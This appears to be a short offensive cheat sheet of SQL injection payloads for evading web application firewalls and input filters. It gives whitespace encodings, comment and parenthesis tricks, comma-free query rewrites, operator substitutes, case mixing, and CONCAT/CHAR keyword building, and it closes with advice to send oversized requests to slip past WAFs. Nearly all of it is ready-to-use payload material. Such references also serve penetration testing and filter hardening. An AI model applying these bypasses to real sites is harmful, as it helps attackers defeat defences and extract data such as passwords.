# Contents

### No Space Allowed

| Technique | Payload |
|------|---------|
|Encode| `%09 (\t)` / `%0A (\n)` / `%0B (vertical tab)` / `%0C (form feed)` / `%0D (\r)` / `%A0 (non breaking space)`
|Comment|`/**/` - `SELECT/**/password/**/FROM/**/users` |
|Parenthesis|`()` - ``SELECT(password)FROM(users)``|

### No Comma Allowed
Bypass using OFFSET, FROM and JOIN.
| Forbidden | Bypass |
|----------|---------|
|`LIMIT 0,1`|	`LIMIT 1 OFFSET 0` |
|`SUBSTR('SQL',1,1)`|	`SUBSTR('SQL' FROM 1 FOR 1)`|
| `SELECT 1,2,3,4` | `SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### Alternative

|Forbidden|Bypass|
|---------|------|
|`AND` 	| `&&` |
|`OR` 	| `\|\|` |
| `=`| `LIKE, REGEXP, BETWEEN` |
| `>` | `NOT BETWEEN 0 AND X` |
| `WHERE` | `HAVING` |

### Using uppercase/lowercase
`SeLecT * FRom users`

### Bypass keyword by String Concatenation
Example bypass keyword `admin`:

`SELECT * FROM users WHERE username=CONCAT('a','d','min')`
or `SELECT * FROM users WHERE username=CHAR(0x61,0x64,0x6D,0x69,0x6E)`

### Abuse WAF limit
- Many a times, WAFs have a limit on how much of the HTTP request they are meant to handle.
- By sending a HTTP request with a size greater than the limit, we can fully evade WAFs.



